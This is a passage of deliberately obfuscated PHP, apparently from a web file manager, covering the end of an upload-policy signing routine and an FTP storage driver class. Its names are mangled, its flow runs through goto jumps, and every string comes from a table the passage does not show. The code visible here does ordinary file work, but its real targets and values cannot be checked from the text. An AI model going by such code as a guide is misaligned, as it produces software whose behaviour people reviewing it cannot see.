$C–¿£…Êˆ– = array($FÒ‡óîŠ÷ê[1102] => gmdate($FÒ‡óîŠ÷ê[1101], strtotime($FÒ‡óîŠ÷ê[1137])), $FÒ‡óîŠ÷ê[1103] => array(array($FÒ‡óîŠ÷ê[1105] => $this->bucket), array($FÒ‡óîŠ÷ê[1104] => $b²ô–Íóˆ”), array($FÒ‡óîŠ÷ê[1106], $FÒ‡óîŠ÷ê[1107], $FÒ‡óîŠ÷ê[33]), array($FÒ‡óîŠ÷ê[1106], $FÒ‡óîŠ÷ê[1138], $FÒ‡óîŠ÷ê[33]), array($FÒ‡óîŠ÷ê[1106], $FÒ‡óîŠ÷ê[1139], $FÒ‡óîŠ÷ê[33]), array($FÒ‡óîŠ÷ê[1108] => $Cö±Ä…Ÿäº), array($FÒ‡óîŠ÷ê[1140] => $fÍì¤¸ğÜí), array($FÒ‡óîŠ÷ê[1141] => $AØŒİ¡ÍŒŒ), array($FÒ‡óîŠ÷ê[1142] => $FÜÒÁÖòí), array($FÒ‡óîŠ÷ê[1143] => $eŠššœÔ™))); goto Fñ„™ÏØÌß; e¾Öµº£…Ü: $BŞöğáŠÃ = $FÒ‡óîŠ÷ê[1136]; $eŠššœÔ™ = $Eƒê‚‰ÁâÃ . $FÒ‡óîŠ÷ê[33]; $Cö±Ä…Ÿäº = $FÒ‡óîŠ÷ê[1100]; goto Bì‰¹Ã°¬å; CÁ»¿ç›©æ: $FÒ‡óîŠ÷ê =& $_SERVER[¼€¼ˆ¦‚¡]; $b²ô–Íóˆ” = $FÒ‡óîŠ÷ê[185]; $AØŒİ¡ÍŒŒ = $FÒ‡óîŠ÷ê[1134]; goto AêÂ©ùÌÈò; Fñ„™ÏØÌß: $dìö‰•¾ï = base64_encode(json_encode($C–¿£…Êˆ–)); $Fê£Ã ã°– = hash_hmac($FÒ‡óîŠ÷ê[1144], $E ‘Ÿ¶ë, $FÒ‡óîŠ÷ê[1145] . $this->secret, !0); $b©ŸÜğ¤¬ = hash_hmac($FÒ‡óîŠ÷ê[1144], $this->region, $Fê£Ã ã°–, !0); goto f¼á—§çä…; DäŠ‡Ó˜ĞŠ: $EöáÇ”âº = array($FÒ‡óîŠ÷ê[199] => $FÒ‡óîŠ÷ê[33], $FÒ‡óîŠ÷ê[1146] => $FÒ‡óîŠ÷ê[33], $FÒ‡óîŠ÷ê[1104] => $b²ô–Íóˆ”, $FÒ‡óîŠ÷ê[1108] => $Cö±Ä…Ÿäº, $FÒ‡óîŠ÷ê[1112] => $dìö‰•¾ï, $FÒ‡óîŠ÷ê[1147] => $fÍì¤¸ğÜí, $FÒ‡óîŠ÷ê[1148] => $AØŒİ¡ÍŒŒ, $FÒ‡óîŠ÷ê[1149] => $FÜÒÁÖòí, $FÒ‡óîŠ÷ê[1150] => $eŠššœÔ™, $FÒ‡óîŠ÷ê[1151] => $aºåõÍ¢¹, $FÒ‡óîŠ÷ê[169] => $this->getHost()); return $EöáÇ”âº; goto f² §³Ã®; f¼á—§çä…: $FˆÈŸ‰ªö = hash_hmac($FÒ‡óîŠ÷ê[1144], $EÔä®¤ÈÙ¾, $b©ŸÜğ¤¬, !0); $DØ“ŒÖ—Î¥ = hash_hmac($FÒ‡óîŠ÷ê[1144], $BŞöğáŠÃ, $FˆÈŸ‰ªö, !0); $aºåõÍ¢¹ = hash_hmac($FÒ‡óîŠ÷ê[1144], $dìö‰•¾ï, $DØ“ŒÖ—Î¥); goto DäŠ‡Ó˜ĞŠ; f² §³Ã®: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($dçåÀ£Ä²) { parent::__construct(); if (count($dçåÀ£Ä²) > 0) { $this->_init($dçåÀ£Ä²); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($cÎÉ‘”ì) { $c¿×·»™çœ =& $_SERVER[¼€¼ˆ¦‚¡]; global $config; $this->appCharset = $config[$c¿×·»™çœ[1152]]; $this->systemCharset = $config[$c¿×·»™çœ[1153]]; if (isset($cÎÉ‘”ì[$c¿×·»™çœ[1154]]) && $cÎÉ‘”ì[$c¿×·»™çœ[1154]]) { $this->systemCharset = $cÎÉ‘”ì[$c¿×·»™çœ[1154]]; } } public function iconvApp($eÉßÕáº×‡) { return $this->iconvTo($eÉßÕáº×‡, $this->systemCharset, $this->appCharset); } public function iconvSystem($e—£ÏïÈÚÅ) { return $this->iconvTo($e—£ÏïÈÚÅ, $this->appCharset, $this->systemCharset); } public function getPathOuter($A‚Â£ø¢•—) { goto c¸‘…ŒµËÍ; aÊõ¯»ÓÆÀ: if (substr($f—ÄÖ“ë¿¬, 0, 2) == $ağ¯¡ÖæÂ[1155]) { $f—ÄÖ“ë¿¬ = BASIC_PATH . substr($f—ÄÖ“ë¿¬, 2); } if (substr($A‚Â£ø¢•—, 0, 2) == $ağ¯¡ÖæÂ[1155]) { $A‚Â£ø¢•— = BASIC_PATH . substr($A‚Â£ø¢•—, 2); } $f—ÄÖ“ë¿¬ = KodIO::clear($f—ÄÖ“ë¿¬); goto dÉÒ¸äÑÙ½; cÎÉØÔ­ÊÂ: return $this->pathDriver . $ağ¯¡ÖæÂ[8] . ltrim($A‚Â£ø¢•—, $ağ¯¡ÖæÂ[8]); goto Aè‚óóØ‹”; dÉÒ¸äÑÙ½: $A‚Â£ø¢•— = KodIO::clear($A‚Â£ø¢•—); $A‚Â£ø¢•— = substr($A‚Â£ø¢•—, strlen($f—ÄÖ“ë¿¬)); if (empty($this->pathDriver)) { return $A‚Â£ø¢•—; } goto cÎÉØÔ­ÊÂ; c¸‘…ŒµËÍ: $ağ¯¡ÖæÂ =& $_SERVER[¼€¼ˆ¦‚¡]; $f—ÄÖ“ë¿¬ = $this->iconvApp($this->pathBase); $A‚Â£ø¢•— = $this->iconvApp($A‚Â£ø¢•—); goto aÊõ¯»ÓÆÀ; Aè‚óóØ‹”: } private function _init($d–”ĞÊ‘Ğ‹ = array()) { $EĞŒš¬²ÊÍ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!function_exists($EĞŒš¬²ÊÍ[1156])) { show_json(LNG($EĞŒš¬²ÊÍ[1157]), !1); } $this->config = $d–”ĞÊ‘Ğ‹; $this->charsetReset($d–”ĞÊ‘Ğ‹); foreach ($d–”ĞÊ‘Ğ‹ as $fÊ‡õĞÕñ‰ => $D·ÖÄåö˜) { if (isset($this->{$fÊ‡õĞÕñ‰})) { $this->{$fÊ‡õĞÕñ‰} = $D·ÖÄåö˜; } } return $this->_login($d–”ĞÊ‘Ğ‹); } private function _login($bš²¤¤‘¦) { goto AÎÇê·ÜáË; bè¶ÈŒ­›¥: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $dÄÛ†‹¹µ¸ = @ftp_login($this->connect, $this->username, $this->userpass); goto Eµæ‹ƒ†•; AòÚÈ‘ã‘Æ: $dÔ¯Ô»…µæ[$fÇÒïÏÂ‰–] = array($FéËÏˆööø[1161] => $this->connect, $FéËÏˆööø[169] => $this->host, $FéËÏˆööø[168] => $this->scheme, $FéËÏˆööø[170] => $this->port); return $dÄÛ†‹¹µ¸; goto bŠñ±½¶´°; AÎÇê·ÜáË: $FéËÏˆööø =& $_SERVER[¼€¼ˆ¦‚¡]; static $dÔ¯Ô»…µæ = array(); $fÇÒïÏÂ‰– = md5(json_encode($bš²¤¤‘¦)); goto bíÙŞò Ë¶; AÓòÃŸ“µ: $c©é»Ÿî’ô = isset($c“÷˜Îœ[$FéËÏˆööø[168]]) && $c“÷˜Îœ[$FéËÏˆööø[168]] == $FéËÏˆööø[1158] ? !0 : !1; $this->scheme = $c©é»Ÿî’ô ? $FéËÏˆööø[1159] : $FéËÏˆööø[1160]; $this->port = isset($c“÷˜Îœ[$FéËÏˆööø[170]]) ? $c“÷˜Îœ[$FéËÏˆööø[170]] : 21; goto bè¶ÈŒ­›¥; bíÙŞò Ë¶: if (isset($dÔ¯Ô»…µæ[$fÇÒïÏÂ‰–])) { foreach ($dÔ¯Ô»…µæ[$fÇÒïÏÂ‰–] as $b¶š‡ğ§½Å => $aÖ¥ÙÎĞµ) { $this->{$b¶š‡ğ§½Å} = $aÖ¥ÙÎĞµ; } return !0; } $c“÷˜Îœ = parse_url(trim($this->server, $FéËÏˆööø[8])); $this->host = $c“÷˜Îœ[$FéËÏˆööø[169]]; goto AÓòÃŸ“µ; Eµæ‹ƒ†•: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $AŠĞ‹õëÏÀ = $this->pasv == $FéËÏˆööø[83] ? !0 : !1; @ftp_pasv($this->connect, $AŠĞ‹õëÏÀ); goto AòÚÈ‘ã‘Æ; bŠñ±½¶´°: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($d¤¤‚‹”ôğ, $cô‡Æª¤‘‚ = '', $aƒØÓä–ÄÑ = REPEAT_RENAME) { if ($this->setContent($d¤¤‚‹”ôğ, $cô‡Æª¤‘‚)) { return $this->getPathOuter($d¤¤‚‹”ôğ); } return !1; } public function mkdir($d®ÓÃÃñÎÚ, $AƒÆ©“•š  = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $d®ÓÃÃñÎÚ = $this->iconvSystem($d®ÓÃÃñÎÚ); if ($this->isFolder($d®ÓÃÃñÎÚ) || @ftp_mkdir($this->connect, $d®ÓÃÃñÎÚ)) { return $this->getPathOuter($d®ÓÃÃñÎÚ); } if (!$this->mkdir($this->pathFather($d®ÓÃÃñÎÚ))) { return !1; } if ($d®ÓÃÃñÎÚ = @ftp_mkdir($this->connect, $d®ÓÃÃñÎÚ)) { return $this->getPathOuter($d®ÓÃÃñÎÚ); } return !1; } public function copyFile($f«ˆÙ´¢•š, $fÀôÌ÷æ™) { goto dŠĞáİãÌ; dŸßÀ•ÀŠÑ: $this->tempFileRemve($Båó£º¯„Ó); return $eË•…Â••; goto AÚù¶±µƒ; dŠĞáİãÌ: if (!$this->_isconn()) { return !1; } $Eˆ–ä»ÌŠ = $this->pathThis($this->iconvSystem($f«ˆÙ´¢•š)); $Båó£º¯„Ó = $this->tempFile($Eˆ–ä»ÌŠ); goto CŠ»ù‡œò; CŠ»ù‡œò: $aäÌ‡±‚¤‚ = $this->iconvApp($Båó£º¯„Ó); $this->download($f«ˆÙ´¢•š, $aäÌ‡±‚¤‚); $eË•…Â•• = $this->upload($fÀôÌ÷æ™, $aäÌ‡±‚¤‚); goto dŸßÀ•ÀŠÑ; AÚù¶±µƒ: } public function moveFile($F†á‹“ïÖÔ, $Eäš›¯Éƒ–) { if (!$this->_isconn()) { return !1; } $F†á‹“ïÖÔ = $this->iconvSystem($F†á‹“ïÖÔ); $Eäš›¯Éƒ– = $this->iconvSystem($Eäš›¯Éƒ–); $E²Åå‡©„ = @ftp_rename($this->connect, $F†á‹“ïÖÔ, $Eäš›¯Éƒ–); return $E²Åå‡©„ ? $this->getPathOuter($Eäš›¯Éƒ–) : !1; } public function delFile($e áÓ›ùè) { if (!$this->_isconn()) { return !1; } $e áÓ›ùè = $this->iconvSystem($e áÓ›ùè); return @ftp_delete($this->connect, $e áÓ›ùè); } public function delFolder($EÆÓ³ØÚ÷Î) { if (!$this->_isconn()) { return !1; } $EÆÓ³ØÚ÷Î = $this->iconvSystem($EÆÓ³ØÚ÷Î); $c¹¿ÓÏ˜È§ = $this->ftpList($EÆÓ³ØÚ÷Î); if (!$c¹¿ÓÏ˜È§) { return @ftp_rmdir($this->connect, $EÆÓ³ØÚ÷Î); } foreach ($c¹¿ÓÏ˜È§ as $BãØÙ‡Ê) { if ($this->isFolder($BãØÙ‡Ê)) { $BãØÙ‡Ê = $this->iconvApp($BãØÙ‡Ê); $this->delFolder($BãØÙ‡Ê); } else { @ftp_delete($this->connect, $BãØÙ‡Ê); } } return @ftp_rmdir($this->connect, $EÆÓ³ØÚ÷Î); } public function rename($D¬µ¬Ù˜‹, $dÍ¢âÁ‰²Ü) { goto bİ™ëÄ“˜­; AÛ©ğÒÚî: return $Aİˆ¦£»ˆì ? $this->getPathOuter($f¥ğî ¿„) : !1; goto A Š¾ÑÖ×; a¬»‘…½¯: $Bóé¼©É„• = $this->iconvSystem($Bóé¼©É„•); $D¬µ¬Ù˜‹ = $this->iconvSystem($D¬µ¬Ù˜‹); $Eçéª­éŸ„ = $this->pathFather($D¬µ¬Ù˜‹); goto f«Ä¬ë¸÷é; bİ™ëÄ“˜­: $b˜ÍÅ˜åõë =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->_isconn()) { return !1; } $Bóé¼©É„• = $this->fileNameAuto($this->pathFather($D¬µ¬Ù˜‹), $dÍ¢âÁ‰²Ü); goto a¬»‘…½¯; f«Ä¬ë¸÷é: $f¥ğî ¿„ = rtrim($Eçéª­éŸ„, $b˜ÍÅ˜åõë[8]) . $b˜ÍÅ˜åõë[8] . $Bóé¼©É„•; $Aİˆ¦£»ˆì = @ftp_rename($this->connect, $D¬µ¬Ù˜‹, $f¥ğî ¿„); $f¥ğî ¿„ = $this->iconvApp($f¥ğî ¿„); goto AÛ©ğÒÚî; A Š¾ÑÖ×: } private function folderInfo($Eó“ÃìÅ, $cšô„ŒÔÏ = false) { goto e‹„îğÆª¥; BìÄŒ¯šÊ…: return $D­ŠÑœ°óĞ; goto aÙê®Â£Éê; fŠÓ±ÉÇñ: $e‰«•ê„¦ˆ = $this->iconvSystem($Eó“ÃìÅ); if ($cšô„ŒÔÏ) { return array($B¿…«ƒá¶ñ[28] => $fšíÜÖ™¡à, $B¿…«ƒá¶ñ[75] => $F‰²Éóë, $B¿…«ƒá¶ñ[29] => $B¿…«ƒá¶ñ[76]); } $D­ŠÑœ°óĞ = array($B¿…«ƒá¶ñ[28] => $fšíÜÖ™¡à, $B¿…«ƒá¶ñ[75] => $F‰²Éóë, $B¿…«ƒá¶ñ[29] => $B¿…«ƒá¶ñ[76], $B¿…«ƒá¶ñ[187] => 0, $B¿…«ƒá¶ñ[107] => 0, $B¿…«ƒá¶ñ[1162] => !0, $B¿…«ƒá¶ñ[1163] => !0); goto BìÄŒ¯šÊ…; e‹„îğÆª¥: $B¿…«ƒá¶ñ =& $_SERVER[¼€¼ˆ¦‚¡]; $F‰²Éóë = $this->getPathOuter(rtrim($Eó“ÃìÅ, $B¿…«ƒá¶ñ[8])); $fšíÜÖ™¡à = $this->pathThis($F‰²Éóë); goto fŠÓ±ÉÇñ; aÙê®Â£Éê: } private function fileInfo($cƒ‰…ÆóÀ, $D¾¨µÁĞ— = false) { goto c¥÷Ä›†ˆ‰; cœ«Ôˆç‘Ø: $cëéì¢å¬ = $this->iconvSystem($cƒ‰…ÆóÀ); if ($D¾¨µÁĞ—) { return array($aÖ×©éÖ½æ[28] => $f œ•½öšÂ, $aÖ×©éÖ½æ[75] => $fÖÕÔîÙò, $aÖ×©éÖ½æ[29] => $aÖ×©éÖ½æ[167], $aÖ×©éÖ½æ[160] => $this->ext($cƒ‰…ÆóÀ), $aÖ×©éÖ½æ[77] => $this->size($cƒ‰…ÆóÀ)); } $eÇÎŠ†öÁœ = array($aÖ×©éÖ½æ[28] => $f œ•½öšÂ, $aÖ×©éÖ½æ[75] => $fÖÕÔîÙò, $aÖ×©éÖ½æ[29] => $aÖ×©éÖ½æ[167], $aÖ×©éÖ½æ[187] => 0, $aÖ×©éÖ½æ[107] => @ftp_mdtm($this->connect, $cëéì¢å¬), $aÖ×©éÖ½æ[160] => $this->ext($cƒ‰…ÆóÀ), $aÖ×©éÖ½æ[77] => $this->size($cƒ‰…ÆóÀ), $aÖ×©éÖ½æ[1162] => !0, $aÖ×©éÖ½æ[1163] => !0); goto EÙ¬Í¿®; c¥÷Ä›†ˆ‰: $aÖ×©éÖ½æ =& $_SERVER[¼€¼ˆ¦‚¡]; $fÖÕÔîÙò = $this->getPathOuter(rtrim($cƒ‰…ÆóÀ, $aÖ×©éÖ½æ[8])); $f œ•½öšÂ = $this->pathThis($fÖÕÔîÙò); goto cœ«Ôˆç‘Ø; EÙ¬Í¿®: $eÇÎŠ†öÁœ[$aÖ×©éÖ½æ[107]] = $eÇÎŠ†öÁœ[$aÖ×©éÖ½æ[107]] > 0 ? $eÇÎŠ†öÁœ[$aÖ×©éÖ½æ[107]] : 0; return $eÇÎŠ†öÁœ; goto d•½ËÈ; d•½ËÈ: } public function size($a§ÄÇùÉ¹Æ) { $eØœëŠ»Ç = $this->objectMeta($a§ÄÇùÉ¹Æ); return $eØœëŠ»Ç ? $eØœëŠ»Ç[$_SERVER[¼€¼ˆ¦‚¡][77]] : 0; } public function info($B»«£›‰) { if ($this->isFile($B»«£›‰)) { return $this->fileInfo($B»«£›‰, 0); } else { if ($this->isFolder($B»«£›‰)) { return $this->folderInfo($B»«£›‰); } } return !1; } public function exist($FÚ÷Ÿô‚·) { return $this->objectMeta($FÚ÷Ÿô‚·) ? !0 : !1; } public function isFile($DªŠ›â”Òš) { $eğÓÍ¦Âô =& $_SERVER[¼€¼ˆ¦‚¡]; $eÊŒÇšÜ•Œ = $this->objectMeta($DªŠ›â”Òš); return $eÊŒÇšÜ•Œ ? $eÊŒÇšÜ•Œ[$eğÓÍ¦Âô[29]] == $eğÓÍ¦Âô[167] : !1; } public function isFolder($E„²Í›Û¸Æ) { $d÷Ù£¬‘£Ó =& $_SERVER[¼€¼ˆ¦‚¡]; $F—™®˜´Ï = $this->objectMeta($E„²Í›Û¸Æ); return $F—™®˜´Ï ? $F—™®˜´Ï[$d÷Ù£¬‘£Ó[29]] == $d÷Ù£¬‘£Ó[76] : !1; } public function listPath($b“‹Áƒñ”ƒ, $cØ­°º·§½ = false) { goto EÆ¡ôÙƒ¸; EÆ¡ôÙƒ¸: $CÕóŸ™©æ± =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->_isconn()) { return !1; } $b“‹Áƒñ”ƒ = $this->iconvSystem($b“‹Áƒñ”ƒ); goto AæĞî”¼‡; AæĞî”¼‡: $B„ÑŠ¼ÜÕ = $this->ftpList($b“‹Áƒñ”ƒ); $CÖ½ã¿ˆˆÈ = array($CÕóŸ™©æ±[74] => array(), $CÕóŸ™©æ±[73] => array()); if (!$B„ÑŠ¼ÜÕ) { return $CÖ½ã¿ˆˆÈ; } goto EâÈ¯¬Éæ; EâÈ¯¬Éæ: foreach ($B„ÑŠ¼ÜÕ as $b“‹Áƒñ”ƒ) { if ($this->isFolder($b“‹Áƒñ”ƒ)) { $CÖ½ã¿ˆˆÈ[$CÕóŸ™©æ±[74]][] = $this->folderInfo($b“‹Áƒñ”ƒ, $cØ­°º·§½); } else { $CÖ½ã¿ˆˆÈ[$CÕóŸ™©æ±[73]][] = $this->fileInfo($b“‹Áƒñ”ƒ, $cØ­°º·§½); } } return $CÖ½ã¿ˆˆÈ; goto E¿¬¿à«; E¿¬¿à«: } public function has($cöÖ¥‘‚´Š, $cš¯²Ïæ¨ = false, $eÎ˜ÄÃïÅğ = true) { goto f«‹¤Ù˜ó‚; eÉ¤ÒÙ¹ÊÚ: $AŞÕÖš„ß¸ = $this->ftpList($cöÖ¥‘‚´Š); if (!$AŞÕÖš„ß¸) { return !1; } if ($cš¯²Ïæ¨) { return array($E˜â…Š÷Ùµ[191] => 0, $E˜â…Š÷Ùµ[192] => count($AŞÕÖš„ß¸)); } goto EŒËĞÒŞ¸ã; f«‹¤Ù˜ó‚: $E˜â…Š÷Ùµ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->_isconn()) { return !1; } $cöÖ¥‘‚´Š = $this->iconvSystem($cöÖ¥‘‚´Š); goto eÉ¤ÒÙ¹ÊÚ; EŒËĞÒŞ¸ã: foreach ($AŞÕÖš„ß¸ as $cöÖ¥‘‚´Š) { if ($eÎ˜ÄÃïÅğ) { if (!$this->isFolder($cöÖ¥‘‚´Š)) { return !0; } } else { if ($this->isFolder($cöÖ¥‘‚´Š)) { return !0; } } } return !1; goto aÍ‚¶¦‰Ê; aÍ‚¶¦‰Ê: } public function listAll($bãïµ²Õ¿Ø) { goto b¥¨Û¾½ğ©; bøğæµÖßò: foreach ($D÷Í•Œºíí[$d¥Ó«ùÛ§Ó[74]] as $bĞÊáñê¹) { $Aé×­ä® ø[] = array($d¥Ó«ùÛ§Ó[75] => $d¥Ó«ùÛ§Ó[8] . trim(str_replace($bãïµ²Õ¿Ø, $d¥Ó«ùÛ§Ó[33], $bĞÊáñê¹), $d¥Ó«ùÛ§Ó[8]) . $d¥Ó«ùÛ§Ó[8], $d¥Ó«ùÛ§Ó[76] => 1, $d¥Ó«ùÛ§Ó[77] => 0); } foreach ($D÷Í•Œºíí[$d¥Ó«ùÛ§Ó[73]] as $bƒ›Åâ¹ª) { $Aé×­ä® ø[] = array($d¥Ó«ùÛ§Ó[75] => $d¥Ó«ùÛ§Ó[8] . trim(str_replace($bãïµ²Õ¿Ø, $d¥Ó«ùÛ§Ó[33], $bƒ›Åâ¹ª), $d¥Ó«ùÛ§Ó[8]), $d¥Ó«ùÛ§Ó[76] => 0, $d¥Ó«ùÛ§Ó[77] => $this->size($bƒ›Åâ¹ª)); } return $Aé×­ä® ø; goto EŠ˜åÓõ; bÈ¶Çê¨Ú: $D÷Í•Œºíí = array($d¥Ó«ùÛ§Ó[73] => array(), $d¥Ó«ùÛ§Ó[74] => array()); $this->recursionFtpFiles($bãïµ²Õ¿Ø, $D÷Í•Œºíí); $Aé×­ä® ø = array(); goto bøğæµÖßò; b¥¨Û¾½ğ©: $d¥Ó«ùÛ§Ó =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->_isconn()) { return !1; } $bãïµ²Õ¿Ø = $this->iconvSystem($bãïµ²Õ¿Ø); goto bÈ¶Çê¨Ú; EŠ˜åÓõ: } public function getContent($cõÄ’É¬âÄ) { if (!$this->_isconn()) { return !1; } $cõÄ’É¬âÄ = $this->iconvSystem($cõÄ’É¬âÄ); return $this->fileSubstr($cõÄ’É¬âÄ); } public function setContent($cŒ«Áš–ƒƒ, $fˆ®¶³­÷Ñ = '') { goto b«„Üåã; Bá™öª‘²: return $Cß‡¢Ôô—ç; goto Dš¢¦Ì¹Ü²; b«„Üåã: if (!$this->_isconn()) { return !1; } $c”¾’šèÂÍ = $this->pathThis($this->iconvSystem($cŒ«Áš–ƒƒ)); $E¸ñªÔù²¿ = $this->tempFile($c”¾’šèÂÍ); goto a ÛÉä¿ƒ±; a ÛÉä¿ƒ±: file_put_contents($E¸ñªÔù²¿, $fˆ®¶³­÷Ñ); $Cß‡¢Ôô—ç = $this->upload($cŒ«Áš–ƒƒ, $this->iconvApp($E¸ñªÔù²¿)); $this->tempFileRemve($E¸ñªÔù²¿); goto Bá™öª‘²; Dš¢¦Ì¹Ü²: } public function fileSubstr($Dó’ÂùŸ, $bï‡áš©¢‰ = 0, $CƒĞ¯ø¿ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Dó’ÂùŸ, $bï‡áš©¢‰, $CƒĞ¯ø¿); } private function ftpRequest($d–£ğ†ğº, $BÈÌóÕÔì× = 0, $AÄÛ¦İÊ°™ = false) { goto a»ò•²ïâ’; C— îˆöîÃ: curl_setopt($fèÑ÷ŒšŒÅ, CURLOPT_URL, $BƒÄØÊº‚± . $this->pathEncode($d–£ğ†ğº)); curl_setopt($fèÑ÷ŒšŒÅ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($AÄÛ¦İÊ°™) { $E÷Ôºªƒé­ = $BÈÌóÕÔì× + $AÄÛ¦İÊ°™ - 1; curl_setopt($fèÑ÷ŒšŒÅ, CURLOPT_RANGE, "{$BÈÌóÕÔì×}\55{$E÷Ôºªƒé­}"); } goto bˆç È©ÉŒ; bˆç È©ÉŒ: curl_setopt($fèÑ÷ŒšŒÅ, CURLOPT_RETURNTRANSFER, 1); $d¹…°ŒÏÏ¨ = curl_exec($fèÑ÷ŒšŒÅ); curl_close($fèÑ÷ŒšŒÅ); goto Aˆñ±£Úïæ; a»ò•²ïâ’: $d–£ğ†ğº = $this->iconvSystem($d–£ğ†ğº); $BƒÄØÊº‚± = $this->scheme . $this->host . $_SERVER[¼€¼ˆ¦‚¡][4] . $this->port; $fèÑ÷ŒšŒÅ = curl_init(); goto C— îˆöîÃ; Aˆñ±£Úïæ: return $d¹…°ŒÏÏ¨; goto E–—Ø„¹„; E–—Ø„¹„: } public function upload($E†ò¥©ä°¬, $DÇ³ğ¢£º…, $d³æíš…Ÿë = false, $dƒ´îä¶Â¢ = REPEAT_REPLACE) { goto dçì²Üè«Ó; b®¼¬â´–È: $DÇ³ğ¢£º… = $this->iconvSystem($DÇ³ğ¢£º…); $F‘Ì¦—Ó÷ = ftp_nb_put($this->connect, $E†ò¥©ä°¬, $DÇ³ğ¢£º…, FTP_BINARY); while ($F‘Ì¦—Ó÷ == FTP_MOREDATA) { $F‘Ì¦—Ó÷ = ftp_nb_continue($this->connect); } goto Eå­¨œ†á—; dçì²Üè«Ó: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($E†ò¥©ä°¬))) { return !1; } $E†ò¥©ä°¬ = $this->iconvSystem($E†ò¥©ä°¬); goto b®¼¬â´–È; Eå­¨œ†á—: if ($F‘Ì¦—Ó÷ != FTP_FINISHED) { return !1; } return $this->getPathOuter($E†ò¥©ä°¬); goto Bƒ‡§ë“; Bƒ‡§ë“: } public function download($EÙäŸ‚á™İ, $cºØâ˜Å¹Ó = '') { goto dàñØˆ¢‚•; dàñØˆ¢‚•: if (!$this->_isconn()) { return !1; } $Bó˜¯¬ÚêÆ = $this->pathFather($cºØâ˜Å¹Ó); if (!IO::mkdir($Bó˜¯¬ÚêÆ)) { return !1; } goto F“¿õ“°™Ô; F“¿õ“°™Ô: $EÙäŸ‚á™İ = $this->iconvSystem($EÙäŸ‚á™İ); $cºØâ˜Å¹Ó = $this->iconvSystem($cºØâ˜Å¹Ó); $a«Ø»øÔ = ftp_nb_get($this->connect, $cºØâ˜Å¹Ó, $EÙäŸ‚á™İ, FTP_BINARY); goto F¨Éèƒ–; F¨Éèƒ–: while ($a«Ø»øÔ == FTP_MOREDATA) { $a«Ø»øÔ = ftp_nb_continue($this->connect); } if ($a«Ø»øÔ != FTP_FINISHED) { return !1; } return $this->iconvApp($cºØâ˜Å¹Ó); goto EƒÔ½œÙÑ; EƒÔ½œÙÑ: } private function ftpList($B½º“ç÷±) { goto A¤‰›÷ÅÒ”; A¤‰›÷ÅÒ”: $B¥†Á“öƒ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->isFolder($B½º“ç÷±)) { return !1; } @ftp_chdir($this->connect, $B¥†Á“öƒ[8]); goto e»’„¯…ô§; AÄîˆ¹‚‡Ú: $E‡ˆ ›Ø—Ç = array_diff($E‡ˆ ›Ø—Ç, array($B¥†Á“öƒ[91], $B¥†Á“öƒ[1165], $B½º“ç÷± . $B¥†Á“öƒ[91], $B½º“ç÷± . $B¥†Á“öƒ[1165])); $AÓŒ…ŒšÎô = array(); foreach ($E‡ˆ ›Ø—Ç as $F„¸Û¸È¤›) { if (!strstr($F„¸Û¸È¤›, $B¥†Á“öƒ[8])) { $F„¸Û¸È¤› = $B½º“ç÷± . ltrim($F„¸Û¸È¤›, $B¥†Á“öƒ[8]); } $AÓŒ…ŒšÎô[] = $this->iconvApp($F„¸Û¸È¤›); } goto EÚÁò…ìƒÊ; EÚÁò…ìƒÊ: return $AÓŒ…ŒšÎô; goto fÏÚŠ¢öß; e»’„¯…ô§: $B½º“ç÷± = rtrim($B½º“ç÷±, $B¥†Á“öƒ[8]) . $B¥†Á“öƒ[8]; $E‡ˆ ›Ø—Ç = @ftp_nlist($this->connect, $B½º“ç÷±); if ($E‡ˆ ›Ø—Ç === !1) { $E‡ˆ ›Ø—Ç = @ftp_rawlist($this->connect, $B½º“ç÷±); foreach ($E‡ˆ ›Ø—Ç as $D÷Ûß•Óöä => $B ¹ñ‘ì³Ç) { $E‡ˆ ›Ø—Ç[$D÷Ûß•Óöä] = end(explode($B¥†Á“öƒ[1164], $B ¹ñ‘ì³Ç)); } } goto AÄîˆ¹‚‡Ú; fÏÚŠ¢öß: } private function recursionFtpFiles($dÈšˆ´º¿‹, &$dè­æ¥§–Ö) { $c¥–¶¶’áÎ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->_isconn()) { return !1; } if (!($Eïµ—ğ·æÓ = $this->ftpList($dÈšˆ´º¿‹))) { return !1; } foreach ($Eïµ—ğ·æÓ as $dÈšˆ´º¿‹) { if ($this->isFolder($dÈšˆ´º¿‹)) { $this->recursionFtpFiles($dÈšˆ´º¿‹, $dè­æ¥§–Ö); $dè­æ¥§–Ö[$c¥–¶¶’áÎ[74]][] = $dÈšˆ´º¿‹; } else { $dè­æ¥§–Ö[$c¥–¶¶’áÎ[73]][] = $dÈšˆ´º¿‹; } } } private function objectMeta($BÃºìº¤¬¦) { goto eœ¬äÁˆ¿ğ; eœ¬äÁˆ¿ğ: $Cì¢­èÆà¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $fÇÖ¡èÍâÂ = $Cì¢­èÆà¯[1166] . md5($BÃºìº¤¬¦); $B°ñ ˆÜ²¤ = Cache::get($fÇÖ¡èÍâÂ); goto AÍÏ›“¤; AÍÏ›“¤: if ($B°ñ ˆÜ²¤ !== null && $B°ñ ˆÜ²¤ !== !1) { return $B°ñ ˆÜ²¤; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $Cì¢­èÆà¯[8]); goto CÏ¿ğ¼¢ê; CÏ¿ğ¼¢ê: $bù×Ù¯È‚£ = @ftp_size($this->connect, $this->iconvSystem($BÃºìº¤¬¦)); if ($bù×Ù¯È‚£ != -1) { 